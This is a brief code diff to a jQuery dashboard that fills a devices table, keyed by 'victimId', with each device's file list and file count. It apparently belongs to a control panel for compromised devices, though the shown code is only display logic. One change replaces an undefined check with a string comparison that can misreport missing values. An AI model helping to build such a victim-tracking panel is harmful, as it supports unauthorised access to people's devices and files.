@@ -8,7 +8,8 @@ $(document).ready(function() {
               const tbody = $('#devicesTable tbody');
               tbody.empty(); // Clear existing rows
 
-              for (const [victimId, device] of Object.entries(data)) {
+              for (const device of data) {  // Loop through data as an array
+                  const victimId = device.victimId; // Get victimId
                   const fileListId = `file-list-${victimId}`;
                   let fileListHtml = '';
 
@@ -50,7 +51,7 @@ $(document).ready(function() {
                       : 'N/A';
 
                   // Ensure totalFiles value is included
-                  const totalFiles = device.totalFiles !== undefined ? device.totalFiles : 'N/A';
+                  const totalFiles = device.totalFiles !== 'NA' ? device.totalFiles : 'N/A';
 
                   // Create the table row with the device information
                   const row = $(`
